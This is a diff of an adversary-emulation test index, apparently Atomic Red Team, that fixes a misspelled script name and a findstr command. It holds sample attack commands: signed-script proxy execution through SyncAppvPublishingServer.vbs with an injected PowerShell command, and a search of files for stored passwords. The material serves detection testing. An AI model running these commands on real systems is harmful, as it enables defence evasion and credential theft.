@@ -11705,8 +11705,8 @@ defense-evasion:
           localhost "script:#{remote_payload}"
 
 '
-    - name: SyncAppvPublishingServe Signed Script PowerShell Command Execution
-      description: 'Executes the signed SyncAppvPublishingServe script with options
+    - name: SyncAppvPublishingServer Signed Script PowerShell Command Execution
+      description: 'Executes the signed SyncAppvPublishingServer script with options
         to execute an arbitrary PowerShell command.
 
 '
@@ -11720,7 +11720,7 @@ defense-evasion:
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'C:\windows\system32\SyncAppvPublishingServe.vbs “\n;#{command_to_execute}”
+        command: 'C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}"
 
 '
     - name: manage-bde.wsf Signed Script Command Execution
@@ -19885,7 +19885,7 @@ credential-access:
         name: powershell
         elevation_required: false
         command: |
-          findstr /si pass *.xml | *.doc | *.txt | *.xls
+          findstr /si pass *.xml *.doc *.txt *.xls
           ls -R | select-string -Pattern password
     - name: Access unattend.xml
       description: 'Attempts to access unattend.xml, where credentials are commonly
@@ -23311,8 +23311,8 @@ execution:
           localhost "script:#{remote_payload}"
 
 '
-    - name: SyncAppvPublishingServe Signed Script PowerShell Command Execution
-      description: 'Executes the signed SyncAppvPublishingServe script with options
+    - name: SyncAppvPublishingServer Signed Script PowerShell Command Execution
+      description: 'Executes the signed SyncAppvPublishingServer script with options
         to execute an arbitrary PowerShell command.
 
 '
@@ -23326,7 +23326,7 @@ execution:
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'C:\windows\system32\SyncAppvPublishingServe.vbs “\n;#{command_to_execute}”
+        command: 'C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}"
 
 '
     - name: manage-bde.wsf Signed Script Command Execution
